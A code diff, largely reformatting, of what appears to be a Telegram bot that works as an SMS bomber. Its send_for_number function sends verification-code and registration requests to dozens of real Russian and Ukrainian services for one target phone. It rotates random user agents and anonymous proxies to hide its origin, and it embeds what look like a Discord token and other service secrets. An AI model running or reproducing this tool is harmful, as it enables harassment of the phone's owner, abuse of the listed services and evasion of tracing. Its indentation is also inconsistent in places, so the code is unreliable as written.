@@ -36,6 +36,7 @@ banned = []
 admins = ['906123359', '1218845111']
 phones = []
 
+
 def check(thisid):
 	global banned
 	t = True
@@ -43,6 +44,7 @@ def check(thisid):
 		if str(ban) == str(thisid):
 			t = False
 	return t
+
 
 @dp.message_handler(commands=['start'])
 async def send_welcome(message: types.Message):
@@ -130,9 +132,15 @@ def send_for_number(phone):
 	)
 
 	for x in range(12):
-		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		_name = _name + \
+		    random.choice(
+		        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		password = _name + \
+		    random.choice(
+		        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		username = _name + \
+		    random.choice(
+		        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 	iteration = 0
 	_email = _name + f'{iteration}' + '@gmail.com'
 	email = _name + f'{iteration}' + '@gmail.com'
@@ -141,26 +149,35 @@ def send_for_number(phone):
 	_phone9 = _phone[1:]
 	_phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
 													   9:11]  # +7+(915)350-99-08
-	_phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]  # 915+350-99-08
+	_phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + \
+	    '-' + _phone9[6:8] + '-' + _phone9[8:10]  # 915+350-99-08
 	_phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
 													   9:11]  # '+7+(915)350-99-08'
 	_phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
 														 9:11]  # '+7 (915) 350 99 08'
-	_phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'
+	_phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + \
+	    _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'
 	_phonePozichka = '+' + _phone[0:2] + '-' + _phone[2:5] + '-' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[
 														10:12]  # 38-050-669-16-10'
 	_phoneQ = '+' + _phone[0:2] + '(' + _phone[2:5] + ') ' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[
 													  10:12]  # +38(050) 669 16 10
-	_phoneCitrus = '+' + _phone[0:3] + ' ' + _phone[3:5] + '-' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[10:12]
-	_phoneComfy = '+' + _phone[0:2] + ' (' + _phone[2:5] + ') ' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[10:12]
-	_phone88 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + '-' + _phone[9:11]
+	_phoneCitrus = '+' + _phone[0:3] + ' ' + _phone[3:5] + \
+	    '-' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[10:12]
+	_phoneComfy = '+' + _phone[0:2] + ' (' + _phone[2:5] + ') ' + \
+	                                     _phone[5:8] + '-' + \
+	                                         _phone[8:10] + '-' + _phone[10:12]
+	_phone88 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + \
+	                                _phone[4:7] + ' ' + _phone[7:9] + \
+	                                    '-' + _phone[9:11]
 	_phone585 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
 													  9:11]  # +7 (925) 350-99-01
 	request_timeout = 0.01
 	phone = _phone
 	iteration = 0
 	ua = UserAgent()
-	proxy_for_spam = requests.get('https://www.proxy-list.download/api/v1/get?type=http&anon=elite').text.split('\r\n')
+	proxy_for_spam = requests.get(
+	    'https://www.proxy-list.download/api/v1/get?type=http&anon=elite').text.split('\r\n')
+
 	def phone_format(phone, maska):
 		if len(phone) == maska.count('X'):
 			str_list = list(phone)
@@ -169,129 +186,141 @@ def send_for_number(phone):
 			return mask
 	_name = ''
 	for x in range(12):
-		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-	_nameR = ['Александр', 'Алексей', 'Анатолий', 'Андрей', 'Антон', 'Аркадий', 'Арсений', 'Артём', 'Артур', 'Борис', 'Вадим', 'Валентин', 'Валерий', 'Василий', 'Виктор', 'Виталий', 'Владимир', 'Владислав', 'Вячеслав', 'Георгий', 'Глеб', 'Григорий', 'Даниил', 'Денис', 'Дмитрий', 'Евгений', 'Егор', 'Иван', 'Игорь', 'Илья', 'Кирилл', 'Константин', 'Лев', 'Леонид', 'Максим', 'Марк', 'Матвей', 'Михаил', 'Никита', 'Николай', 'Олег', 'Павел', 'Пётр', 'Роман', 'Руслан', 'Сергей', 'Степан', 'Тимур', 'Фёдор', 'Юрий', 'Ярослав']
+		_name = _name + \
+			random.choice(
+				list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		password = _name + \
+			random.choice(
+				list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		username = _name + \
+			random.choice(
+				list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	_nameR = ['Александр', 'Алексей', 'Анатолий', 'Андрей', 'Антон', 'Аркадий', 'Арсений', 'Артём', 'Артур', 'Борис', 'Вадим', 'Валентин', 'Валерий', 'Василий', 'Виктор', 'Виталий', 'Владимир', 'Владислав', 'Вячеслав', 'Георгий', 'Глеб', 'Григорий', 'Даниил', 'Денис',
+		'Дмитрий', 'Евгений', 'Егор', 'Иван', 'Игорь', 'Илья', 'Кирилл', 'Константин', 'Лев', 'Леонид', 'Максим', 'Марк', 'Матвей', 'Михаил', 'Никита', 'Николай', 'Олег', 'Павел', 'Пётр', 'Роман', 'Руслан', 'Сергей', 'Степан', 'Тимур', 'Фёдор', 'Юрий', 'Ярослав']
 	_email = _name + f'{iteration}' + '@gmail.com'
 	email = _name + f'{iteration}' + '@gmail.com'
 	try:
-	  requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {
+		requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {
 		"auth": {"mphone": "+" + _phone, "bdate": "11.11.1999", "deviceid": "00100", "version": "1.0",
-			 "source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json","User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+			 "source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json", "User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut}, headers={
+	                "User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://izi.ua/api/auth/register",
+		requests.post("https://izi.ua/api/auth/register",
 			  json={
 				"phone": "+" + _phone,
 				"name": "Анастасия",
 				"is_terms_accepted": True,
-			  },headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+			  }, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+	  requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone}, headers={
+	                "User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	 print('-')
+		print('-')
 
 	try:
-	  requests.post('https://api.pozichka.ua/v1/registration/send',
-			  json={"RegisterSendForm": {"phone": _phonePozichka}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post('https://api.pozichka.ua/v1/registration/send',
+			  json={"RegisterSendForm": {"phone": _phonePozichka}}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country": "UA", "phone": phone[3:]},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country": "UA", "phone": phone[3:]}, headers={
+	                "User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
-			  data={"data": _phone, "metod": "postreg"},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
+			  data={"data": _phone, "metod": "postreg"}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
-			  data={"telephone": "8" + _phone[1:]},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
+			  data={"telephone": "8" + _phone[1:]}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://www.moyo.ua/identity/registration",
-			  data={"firstname": "Артем", "phone": _phone, "email": email},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post("https://www.moyo.ua/identity/registration",
+			  data={"firstname": "Артем", "phone": _phone, "email": email}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone}, headers={
+	                "User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-			  data={'phone_number': _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
+			  data={'phone_number': _phone}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+	  requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={
+	                "User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 	  print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
-	  requests.post("https://loany.com.ua/funct/ajax/registration/code",
-			  data={"phone": _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post("https://loany.com.ua/funct/ajax/registration/code",
+			  data={"phone": _phone}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://www.sportmaster.ru/user/session/sendSmsCode.do",
-			  params={"phone": _phone585},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post("https://www.sportmaster.ru/user/session/sendSmsCode.do",
+			  params={"phone": _phone585}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://iqlab.com.ua/session/ajaxregister",
-			  data={"cellphone": _phoneQ},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post("https://iqlab.com.ua/session/ajaxregister",
+			  data={"cellphone": _phoneQ}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	 print('-')
+		print('-')
 
 	try:
-	  requests.post("https://izi.ua/api/auth/register",
+		requests.post("https://izi.ua/api/auth/register",
 			  json={
 				"phone": "+" + _phone,
 				"name": "Артём",
 				"is_terms_accepted": True,
-			  },headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+			  }, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",
+		requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",
 			  json={
 				"doc": {
 				  "auth": {
@@ -306,46 +335,46 @@ def send_for_number(phone):
 			  },
 			  headers={"Accept": "application/json"},
 			  )
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://api.pozichka.ua/v1/registration/send",
+		requests.post("https://api.pozichka.ua/v1/registration/send",
 			  json={
 				"RegisterSendForm": {
 				  "phone": _phonePozichka
 				}
-			  },headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+			  }, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://www.aptekaonline.ru/login/ajax_sms_order.php",
-			  data={"PERSONAL_MOBILE": "+" + _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post("https://www.aptekaonline.ru/login/ajax_sms_order.php",
+			  data={"PERSONAL_MOBILE": "+" + _phone}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://api.cian.ru/sms/v1/send-validation-code/",
-			  json={"phone": "+" + _phone, "type": "authenticateCode"},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post("https://api.cian.ru/sms/v1/send-validation-code/",
+			  json={"phone": "+" + _phone, "type": "authenticateCode"}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 
 	try:
-	  requests.post("https://clients.cleversite.ru/callback/run.php",
+		requests.post("https://clients.cleversite.ru/callback/run.php",
 			  data={
 				"siteid": "62731",
 				"num": _phone,
 				"title": "Онлайн-консультант",
 				"referrer": "https://m.cleversite.ru/call",
-			  },headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+			  }, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	ua = UserAgent()
 	proxy_for_spam = requests.get(
 		'https://www.proxy-list.download/api/v1/get?type=http&anon=elite').text.split('\r\n')
@@ -354,208 +383,224 @@ def send_for_number(phone):
 	password = ''
 	username = ''
 	for x in range(12):
-		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-	_nameR = ['Александр', 'Алексей', 'Анатолий', 'Андрей', 'Антон', 'Аркадий', 'Арсений', 'Артём', 'Артур', 'Борис', 'Вадим', 'Валентин', 'Валерий', 'Василий', 'Виктор', 'Виталий', 'Владимир', 'Владислав', 'Вячеслав', 'Георгий', 'Глеб', 'Григорий', 'Даниил', 'Денис', 'Дмитрий', 'Евгений', 'Егор', 'Иван', 'Игорь', 'Илья', 'Кирилл', 'Константин', 'Лев', 'Леонид', 'Максим', 'Марк', 'Матвей', 'Михаил', 'Никита', 'Николай', 'Олег', 'Павел', 'Пётр', 'Роман', 'Руслан', 'Сергей', 'Степан', 'Тимур', 'Фёдор', 'Юрий', 'Ярослав']
+		_name = _name + \
+		    random.choice(
+		        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		password = _name + \
+		    random.choice(
+		        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		username = _name + \
+		    random.choice(
+		        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	_nameR = ['Александр', 'Алексей', 'Анатолий', 'Андрей', 'Антон', 'Аркадий', 'Арсений', 'Артём', 'Артур', 'Борис', 'Вадим', 'Валентин', 'Валерий', 'Василий', 'Виктор', 'Виталий', 'Владимир', 'Владислав', 'Вячеслав', 'Георгий', 'Глеб', 'Григорий', 'Даниил', 'Денис',
+	    'Дмитрий', 'Евгений', 'Егор', 'Иван', 'Игорь', 'Илья', 'Кирилл', 'Константин', 'Лев', 'Леонид', 'Максим', 'Марк', 'Матвей', 'Михаил', 'Никита', 'Николай', 'Олег', 'Павел', 'Пётр', 'Роман', 'Руслан', 'Сергей', 'Степан', 'Тимур', 'Фёдор', 'Юрий', 'Ярослав']
 	_email = _name + '@gmail.com'
 	email = _name + '@gmail.com'
 	try:
-		requests.post('https://cash-u.com/main/rest/firstrequest/phone/confirmation/send', data = {phone_format(phone, 'X (XXX) XXX-XX-XX'): ''},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+		requests.post('https://cash-u.com/main/rest/firstrequest/phone/confirmation/send', data={phone_format(
+		    phone, 'X (XXX) XXX-XX-XX'): ''}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
 		print('-')
 	try:
-		requests.post('https://www.tanuki.ru/sendCode/', json = {"phone":phone_format(phone, "(+X)XXXXXXXXXX"),"smsType":2,"headers":{"version":"2.0","userId":"666ebf12-9cd5-ed2f-a7c9-67f3a8d99ab1","debugMode":True,"agent":{"device":"mobile","version":"undefined undefined"},"dbgValue":"","langId":"1","cityId":"1"}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+		requests.post('https://www.tanuki.ru/sendCode/', json={"phone": phone_format(phone, "(+X)XXXXXXXXXX"), "smsType": 2, "headers": {"version": "2.0", "userId": "666ebf12-9cd5-ed2f-a7c9-67f3a8d99ab1", "debugMode": True, "agent": {
+		              "device": "mobile", "version": "undefined undefined"}, "dbgValue": "", "langId": "1", "cityId": "1"}}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
 		print('-')
 	try:
-		requests.post('https://goldapple.ru/rest/V1/customer/registration/start', json = {"country_code":"RU","phone":phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+		requests.post('https://goldapple.ru/rest/V1/customer/registration/start', json={
+		              "country_code": "RU", "phone": phone}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
 		print('-')
 	try:
-		requests.get('https://app.taxsee.com/send-link/?intl=ru-RU&phone=%2B' + phone_format(phone, 'XXX(XX)XXX-XX-XX'),headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+		requests.get('https://app.taxsee.com/send-link/?intl=ru-RU&phone=%2B' + phone_format(phone,
+		             'XXX(XX)XXX-XX-XX'), headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
 		print('-')
 	try:
-		requests.post('https://app.burgerking.ru/bridge/auth/index', json = {'phone': "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+		requests.post('https://app.burgerking.ru/bridge/auth/index', json={'phone': "+" + phone}, headers={
+		              "User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
 		print('-')
 	try:
-		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={
+		              'phone': '+' + phone}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
 		print('-')
 	try:
-		requests.post("https://www.gloria-jeans.ru/phone-verification/send-code/registration", json={"phoneNumber": "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+		requests.post("https://www.gloria-jeans.ru/phone-verification/send-code/registration", json={
+		              "phoneNumber": "+" + phone}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
 		print('-')
 	try:
-		requests.post("https://kinoteatr.ru/cgi-bin/api.pl",json={"method": "SendSMSToConfirmPhone","params": {"Phone": phone[1:]}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
+		requests.post("https://kinoteatr.ru/cgi-bin/api.pl", json={"method": "SendSMSToConfirmPhone", "params": {
+		              "Phone": phone[1:]}}, headers={"User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
 		print('-')
 	try:
-		requests.post('https://prosto.tv/wp-admin/admin-ajax.php', data={'action': 'check-phone', 'phone': '+'+phone, "username": random.choice(_nameR), '_nonce': '1a79e1841d'}, headers = {'user-agent': ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		requests.post('https://prosto.tv/wp-admin/admin-ajax.php', data={'action': 'check-phone', 'phone': '+'+phone, "username": random.choice(
+		    _nameR), '_nonce': '1a79e1841d'}, headers={'user-agent': ua.random}, proxies={'http': random.choice(proxy_for_spam)})
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.get(f'https://api.eldorado.ua/v2.0/sign?lang=ru&action=phone_check&login={phone}', headers = {'user-agent': ua.random})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://mobile-api.qiwi.com/oauth/authorize', data = {'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': phone, 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://oll.tv/api/signup?lang=ru', data = {'phone': phone, 'email': _email},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://my.citrus.ua/api/auth/login', json={"identity":phone_format(phone, '+XXX XX XXX XX XX')},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://api.omegatv.com.ua/auth/in', data={'phone': phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://discord.com/api/v8/users/@me/phone', json={"phone":"+"+phone}, headers = {'authorization': 'Nzk5OTExMDgyMDg4MjAyMjQx.YAKdcA.Yyx-Vxd0dRjd2e8FBGYYRQZhMSE','User-Agent': ua.random})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.get(f'https://my.hmara.tv/api/sign?contact={phone}&deviceId=19771abf-60c5-42b1-b0d5-137074fd055d&language=uk&profileId=1&deviceType=2&ver=2.2.9',headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://api.sweet.tv/SignupService/SetPhone.json', json = {"phone":phone,"device":{"type":"DT_Web_Browser","application":{"type":"AT_SWEET_TV_Player"},"model":ua.random,"firmware":{"versionCode":1,"versionString":"2.4.2"},"uuid":"8376b751-a2b1-46f0-b5e3-e6eab6cbbaee","supported_drm":{"widevine_modular":True}},"locale":"uk"},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://api.sweet.tv/SignupService/SetPhone.json', json = {"phone":phone,"device":{"type":"DT_Web_Browser","application":{"type":"AT_TRINITY_Player"},"uuid":"9f95282b-05cd-4ce0-b968-fb0e35a930f5","supported_drm":{"widevine_modular":True}},"locale":"uk"},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('http://fileportalua.net/?page=join', data = {'number':phone_format(phone, '+XX (XXX) XXX XX-XX'), 'ok': 'yes', 'token': ''},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post('https://prosto.tv/wp-admin/admin-ajax.php', data={'action': 'resend-sms', 'phone': '+'+phone, '_nonce': '1a79e1841d'})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={ "client_id":	"6289de851fc726f887af8d5d7a56c635", "User-Agent":   ua.random,},json={"phone": phone})
 		requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={ "client_id":	"6289de851fc726f887af8d5d7a56c635", "User-Agent":   ua.random,},json={"phone": phone})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",data={ "firstname": random.choice(_nameR), "telephone": phone, "email": _email,	"password": password,   "form_key": "Zqqj7CyjkKG2ImM8",},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://youla.ru/web-api/auth/request_code",data={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={  "phone": "+" + phone,   "api": 2,   "email": _email,	"x-email": "x-email",},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={	"msisdn": phone,	"locale": "en", "countryCode": "ru",	"version": "1", "k": "ic1rtwz1s1Hj1O0r",	"r": "46763",},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://auth.multiplex.ua/login",json={"login": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://youla.ru/web-api/auth/request_code",data={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post("https://passport.twitch.tv/register?trusted_request=true",json={ "birthday": {	   "day": 11,	  "month": 11,		"year": 1999	},  "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,  "password": password,   "phone_number": phone,  "username": username,},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
 		requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/",headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	  print('+')
+		print('+')
 	except:
-	  print('-')
+		print('-')
 	try:
